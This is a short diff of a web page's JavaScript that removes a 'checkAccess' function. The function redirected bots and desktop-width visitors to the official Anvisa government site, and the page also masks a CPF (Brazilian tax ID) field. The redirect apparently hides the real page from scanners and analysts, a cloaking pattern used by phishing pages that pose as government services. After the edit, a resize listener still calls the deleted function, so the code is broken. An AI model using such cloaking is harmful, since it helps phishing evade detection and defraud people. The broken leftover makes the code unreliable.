@@ -21,14 +21,7 @@
         return window.innerWidth > 768;
       }
 
-      // Redirecionamento inicial para bloquear acesso suspeito
-      function checkAccess() {
-        if (isBot() || (!isMobile() && isWideScreen())) {
-          window.location.href = "https://www.gov.br/anvisa/pt-br";
-        }
-      }
 
-      window.onload = checkAccess;
       window.addEventListener('resize', checkAccess);
 
       // Máscara de CPF
